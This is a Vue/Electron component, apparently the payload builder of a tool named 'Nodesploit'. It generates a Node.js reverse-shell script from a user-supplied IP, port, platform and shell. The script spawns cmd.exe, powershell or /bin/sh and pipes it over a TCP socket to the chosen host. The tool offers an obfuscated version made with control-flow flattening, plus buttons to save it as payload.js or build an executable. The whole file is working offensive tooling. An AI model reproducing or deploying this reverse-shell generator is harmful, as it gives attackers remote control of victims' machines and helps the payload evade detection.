<template>
  <v-container class="fill-height mx-auto" fluid>
    <div class="mx-auto">
      <h1 class="display-4 font-weight-black">PAYLOAD</h1>
      <v-container>
        <form>
          <v-row>
            <v-col xs="12" sm="6" md="3">
              <v-text-field
                v-model="ip"
                :error-messages="ipErrors"
                label="IP Adresse"
                required
                @input="$v.ip.$touch()"
                @blur="$v.ip.$touch()"
              ></v-text-field>
            </v-col>
            <v-col xs="12" sm="6" md="3">
              <v-text-field
                v-model="port"
                :error-messages="portErrors"
                label="Port"
                required
                @input="$v.port.$touch()"
                @blur="$v.port.$touch()"
              ></v-text-field>
            </v-col>
            <v-col xs="12" sm="6" md="3">
              <v-select v-model="sys" :items="os" label="Platforme" required></v-select>
            </v-col>
            <v-col xs="12" sm="6" md="3">
              <v-select v-model="shell" :items="shells" label="Shell" required></v-select>
            </v-col>
          </v-row>
        </form>
      </v-container>

      <v-container>
          <v-tabs  class="mb-1" v-model="tab" background-color="transparent" color="basil" grow>
            <v-tabs-slider></v-tabs-slider>
              <v-tab :key="1" :href="`#plainJs`">Plain JS</v-tab>
              <v-tab :key="2" :href="`#obfuscedJs`">Obfusced</v-tab>
           </v-tabs>
          <v-tabs-items v-model="tab">
          <v-tab-item :key="1" value="plainJs">
            <v-card  color="basil" flat tile>
              <code v-html="payload" class="py-2" style="width: 100%;"></code>
            </v-card>
          </v-tab-item>
          <v-tab-item :key="2" value="obfuscedJs">
            <v-card color="basil" flat tile>
              <code v-html="obfusced" class="py-2" style="width: 100%;"></code>
            </v-card>
          </v-tab-item>
          </v-tabs-items>
      </v-container>

      <v-container class="d-flex justify-end">
        <template>
          <v-btn class="mr-4" :disabled="this.$v.$invalid" :loading="buildingjs" @click="buildjs">
            Save JS
            <v-icon right dark>mdi-language-javascript</v-icon>
          </v-btn>
          <v-btn :disabled="this.$v.$invalid" class="mr-4" @click="buildexe">
            Build Exe
            <v-icon right dark>mdi-wrench</v-icon>
          </v-btn>
          <v-btn color="error" class="mr-4" @click="reset">Reset</v-btn>
        </template>
      </v-container>
    </div>
  </v-container>
</template>

<script>
import {
  required,
  ipAddress,
  integer,
  between
} from 'vuelidate/lib/validators'
var JavaScriptObfuscator = require('javascript-obfuscator')

export default {
  data () {
    return {
      buildingjs: false,
      tab: null,
      ip: require('ip').address(),
      port: 4443,
      shell: 'cmd.exe',
      sys: 'Windows',
      os: ['Windows', 'Linux', 'Mac OS']
    }
  },

  validations: {
    ip: {
      required,
      ipAddress
    },
    port: {
      required,
      integer,
      between: between(1, 65536)
    }
  },

  computed: {
    payload () {
      return `
      (function(){
          var net = require("net"),
          child = require("child_process"),
          shell = child.spawn("<kbd>${this.shell}</kbd>", []);
          var client = new net.Socket();
          client.connect(<kbd>${this.port}</kbd>, "<kbd>${this.ip}</kbd>", function(){      
            client.pipe(shell.stdin);
            shell.stdout.pipe(client);
            shell.stderr.pipe(client);
          });
          return /a/;
      })();`
    },
    platforme () {
      if (this.sys === 'Windows') {
        return 'cmd.exe'
      } else {
        return '/bin/sh'
      }
    },
    shells () {
      if (this.sys === 'Windows') {
        return ['cmd.exe', 'powershell']
      } else {
        return ['/bin/sh', '/bin/bash']
      }
    },
    obfusced () {
      var obsfusced = JavaScriptObfuscator.obfuscate(
        `(function(){
          var net = require("net"),
          child = require("child_process"),
          shell = child.spawn("${this.shell}", []);
          var client = new net.Socket();
          client.connect(${this.port ? this.port : 0}, "${
          this.ip
        }", function(){      
            client.pipe(shell.stdin);
            shell.stdout.pipe(client);
            shell.stderr.pipe(client);
          });
          return /a/;
      })();`,
        {
          compact: false,
          controlFlowFlattening: true
        }
      )
      return obsfusced.getObfuscatedCode()
    },
    ipErrors () {
      const errors = []
      if (!this.$v.ip.$dirty) return errors
      !this.$v.ip.ipAddress && errors.push('IPv4 format required !')
      !this.$v.ip.required && errors.push('IP Adresse is required.')
      return errors
    },
    portErrors () {
      const errors = []
      if (!this.$v.port.$dirty) return errors

      !this.$v.port.required && errors.push('Port is required')
      !this.$v.port.integer && errors.push('Port must be a number')
      !this.$v.port.between && errors.push('Port must be between 1 and 65536')

      return errors
    }
  },

  methods: {
    validate () {
      this.$v.$touch()
      this.$refs.form.validate()
    },
    reset () {
      this.$v.$reset()
      this.ip = ''
      this.port = ''
    },
    buildexe () {
      if (this.$v.$invalid) {
        return (this.submitStatus = 'ERROR')
      }
      this.$v.$touch()
    },
    buildjs () {
      this.$v.$touch()
      // renderer.js - renderer process example
      const { remote } = require('electron')
      const dialog = remote.dialog
      const WIN = remote.getCurrentWindow()

      const options = {
        title: 'Save Payload JS',
        defaultPath: 'C:\\payload.js',
        buttonLabel: 'Save Payload Nodesploit',
        filters: [{ name: 'Javascript', extensions: ['js'] }]
      }
      var data
      // Or asynchronous - using callback
      if (this.tab === 'plainJs') {
        data = this.payload
      } else if (this.tab === 'obfuscedJs') {
        data = this.obfusced
      }

      var self = this
      function filedone () {
        self.buildingjs = false
      }
      dialog.showSaveDialog(WIN, options).then(file => {
        if (file.canceled) {
        } else {
          self.buildingjs = true
          require('fs').writeFile(file.filePath, data, filedone)
        }
      })
    }
  }
}
</script>
